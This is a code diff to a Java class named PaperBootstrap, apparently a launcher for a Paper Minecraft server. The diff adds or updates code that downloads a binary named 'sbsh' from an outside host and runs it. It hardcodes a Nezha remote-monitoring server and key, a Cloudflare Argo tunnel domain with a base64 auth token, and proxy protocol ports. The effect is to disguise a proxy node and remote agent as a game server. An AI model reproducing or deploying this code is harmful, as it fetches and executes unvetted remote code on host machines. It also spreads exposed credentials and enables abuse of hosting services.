@@ -21,10 +21,11 @@ public final class PaperBootstrap {
     private static Process sbxProcess;
     
     private static final String[] ALL_ENV_VARS = {
-        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
+        "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
         "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
-        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
-        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
+        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
+        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
+        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
     };
 
     private PaperBootstrap() {
@@ -92,14 +93,27 @@ public final class PaperBootstrap {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
+        envVars.put("UUID", "68499c56-d509-42dd-91f6-78052c1306e2");
         envVars.put("FILE_PATH", "./world");
-        envVars.put("UUID", "86537885-8975-4ae5-84ae-f832032ffd85");
-        envVars.put("NEZHA_SERVER", "");
-        envVars.put("NEZHA_PORT", "5555");
-        envVars.put("NEZHA_KEY", "");
+        envVars.put("NEZHA_SERVER", "nezha.ggff.net:8008");
+        envVars.put("NEZHA_PORT", "");
+        envVars.put("NEZHA_KEY", "nezha123@");
+        envVars.put("ARGO_PORT", "8090");
+        envVars.put("ARGO_DOMAIN", "xserver.root.gv.uy");
+        envVars.put("ARGO_AUTH", "eyJhIjoiOGI5NzI0MDgwZTU1ZTcwMzcwZmI3NDI4NzkyMmYzMWIiLCJ0IjoiMDYwYzg2NDMtY2M3ZC00NGI0LTk3MWItYmYwMDRjZTI5ZDUzIiwicyI6IlptTXdNVE15WVRNdE5HTTNNaTAwTmpCbExUZ3pZekV0TjJJM09UbGxNVE5oTnpnMyJ9");
+        envVars.put("S5_PORT", "");
         envVars.put("HY2_PORT", "");
+        envVars.put("TUIC_PORT", "");
+        envVars.put("ANYTLS_PORT", "");
         envVars.put("REALITY_PORT", "");
-        envVars.put("NAME", "");
+        envVars.put("ANYREALITY_PORT", "");
+        envVars.put("UPLOAD_URL", "");
+        envVars.put("CHAT_ID", "");
+        envVars.put("BOT_TOKEN", "");
+        envVars.put("CFIP", "cf.008500.xyz");
+        envVars.put("CFPORT", "443");
+        envVars.put("NAME", "Xerver");
+        envVars.put("DISABLE_ARGO", "false");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
@@ -137,11 +151,11 @@ public final class PaperBootstrap {
         String url;
         
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.ssss.nyc.mn/s-box";
+            url = "https://amd64.ssss.nyc.mn/sbsh";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://arm64.ssss.nyc.mn/s-box";
+            url = "https://arm64.ssss.nyc.mn/sbsh";
         } else if (osArch.contains("s390x")) {
-            url = "https://s390x.ssss.nyc.mn/s-box";
+            url = "https://s390x.ssss.nyc.mn/sbsh";
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
